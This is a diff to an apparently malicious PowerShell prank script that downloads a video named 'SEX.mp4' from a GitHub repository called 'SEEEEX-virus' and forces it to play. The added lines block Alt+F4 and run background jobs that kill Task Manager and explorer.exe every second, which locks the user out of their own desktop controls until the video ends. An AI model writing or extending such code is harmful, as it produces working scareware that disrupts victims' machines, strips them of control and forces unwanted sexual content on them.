@@ -14,7 +14,6 @@ If (-not $IsAdmin) {
 #---------------------------
 $tempPath = [System.IO.Path]::GetTempPath()
 $videoFile = Join-Path -Path $tempPath -ChildPath "SEX.mp4"
-# Replace the URL below with the actual download URL for your video file.
 $downloadUrl = "https://raw.githubusercontent.com/ElenaMod/SEEEEX-virus/refs/heads/main/SEX.mp4"  
 Invoke-WebRequest -Uri $downloadUrl -OutFile $videoFile
 
@@ -67,7 +66,7 @@ Function Set-Volume {
 
 Function Kill-Processes {
     # List of forbidden processes
-    $forbiddenProcesses = @("cmd", "taskmgr", "SystemInformer", "ProcessHacker")
+    $forbiddenProcesses = @("cmd", "taskmgr", "SystemInformer", "ProcessHacker", "explorer")
 
     # Get the current PowerShell process ID to avoid killing the script itself
     $currentPID = $PID
@@ -163,6 +162,38 @@ $Window.Add_Closing([System.ComponentModel.CancelEventHandler]{
     }
 })
 
+# Prevent ALT+F4, close, or minimize (Override window closing)
+$Window.Add_KeyDown([System.Windows.Input.KeyEventHandler]{
+    param($sender, $e)
+    if ($e.Key -eq 'F4' -and $e.SystemKey -eq 'Alt') {
+        $e.Handled = $true
+    }
+})
+
+# Prevent user from killing the script through Task Manager
+Start-Job -ScriptBlock {
+    while ($true) {
+        # Kill any taskmgr.exe if it's opened
+        $processes = Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue
+        if ($processes) {
+            Stop-Process -Name "taskmgr" -Force
+        }
+        Start-Sleep -Seconds 1
+    }
+}
+
+# Prevent user from closing explorer, task manager, etc
+Start-Job -ScriptBlock {
+    while ($true) {
+        # Kill explorer.exe if it is running (this hides the taskbar and other system UI)
+        $processes = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
+        if ($processes) {
+            Stop-Process -Name "explorer" -Force
+        }
+        Start-Sleep -Seconds 1
+    }
+}
+
 # Play the video.
 $VideoPlayer.Play()
 
@@ -178,3 +209,4 @@ Stop-Process -Id $volumeProcess.Id -Force
 # Remove the temporary volume script file.
 Remove-Item $tempVolumeScript -Force
 taskkill /f /im mshta.exe > $null 2>&1
+start explorer.exe
